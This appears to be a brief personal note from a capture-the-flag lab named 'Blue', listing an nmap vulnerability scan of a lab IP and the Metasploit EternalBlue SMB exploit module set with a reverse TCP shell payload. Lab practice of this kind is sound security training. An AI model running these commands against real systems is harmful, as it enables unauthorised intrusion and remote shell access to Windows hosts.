# BLUE

```
export IP=10.10.250.148
```

```
nmap -sV -sC --script=vuln -oN nmap/inicial.out $IP -p- -Pn -vv
```
# metasploit
```
exploit/windows/smb/ms17_010_eternalblue
set payload windows/x64/shell/reverse_tcp
```